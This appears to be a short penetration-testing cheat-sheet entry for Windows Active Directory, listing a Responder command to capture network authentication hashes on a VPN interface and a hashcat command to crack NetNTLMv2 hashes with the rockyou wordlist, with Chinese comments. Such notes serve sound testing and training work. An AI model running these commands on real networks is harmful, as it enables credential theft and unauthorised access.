---
os: windows
service: AD
syntax:
---
responder -I tun0 -dwPv # 开启responder
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt # 如果获得hash,尝试破解

